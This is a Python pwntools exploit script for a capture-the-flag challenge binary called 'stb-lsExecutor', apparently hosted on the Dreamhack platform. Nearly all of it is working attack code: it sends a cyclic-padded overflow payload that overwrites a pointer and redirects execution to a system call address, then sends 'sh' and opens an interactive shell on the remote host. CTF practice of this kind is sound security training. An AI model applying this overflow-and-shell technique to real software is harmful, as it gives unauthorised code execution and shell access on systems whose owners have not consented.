#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./stb-lsExecutor', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
set follow-fork-mode parent
b *main
b *main+72
b *main+111
b *main+159
b *main+250
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
rcu = lambda data: io.recvuntil(data)
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
        #return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path}, gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 23089)
    else:
        return process(elf.path)
        #return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})
bss = elf.bss()
io = start()
sel = 0x404079
system = pack(0x4013b2)
payload = cyclic(40) + b'change_i' + pack(sel + 0x70) + system
sa(b'Enter option : ', cyclic(60))
sa(b'Enter path : ', payload)
sa(b'Again? y/n\n', b'n')

pause()
sl(b'sh')
io.interactive()